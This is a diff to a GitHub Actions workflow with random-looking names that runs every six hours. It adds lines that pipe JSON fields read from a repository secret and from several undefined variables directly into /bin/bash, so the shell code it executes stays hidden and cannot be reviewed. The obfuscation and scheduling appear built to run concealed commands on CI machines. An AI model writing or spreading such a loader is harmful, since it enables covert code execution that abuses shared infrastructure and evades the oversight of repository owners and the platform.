@@ -1,11 +1,9 @@
 name: jixuanyuan4756
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 0/6 * * *'
-
-jobs:  # 16458
+    - cron: '2 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,8 +11,16 @@ jobs:  # 16458
       - uses: actions/checkout@v4
       - name: jixuanyuan4756
         env:
-          kzvuv2098: ${{ secrets.kzvuv2098 }}
+          mq54469: ${{ secrets.mq54469 }}
         run: |
-          echo $kzvuv2098 | jq -r .suh9 | /bin/bash
-          echo $zj4 | jq -r .zjj260 | /bin/bash
+          echo $mq54469 | jq -r .ocn5 | /bin/bash
+          echo $w251 | jq -r .hvl110 | /bin/bash
+          echo $vpqms2586 | jq -r .hxwe4 | /bin/bash
+          echo $uyvq6 | jq -r .pzk838 | /bin/bash
+          echo $n3 | jq -r .uzz18596 | /bin/bash
+          echo $wyi26 | jq -r .qfb22 | /bin/bash
+          echo $j97 | jq -r .wta66127 | /bin/bash
+          echo $sgfx4 | jq -r .fwkt80519 | /bin/bash
+          echo $kd61614 | jq -r .fmrk00267 | /bin/bash
+          echo $hqgz210 | jq -r .yuax3 | /bin/bash
 
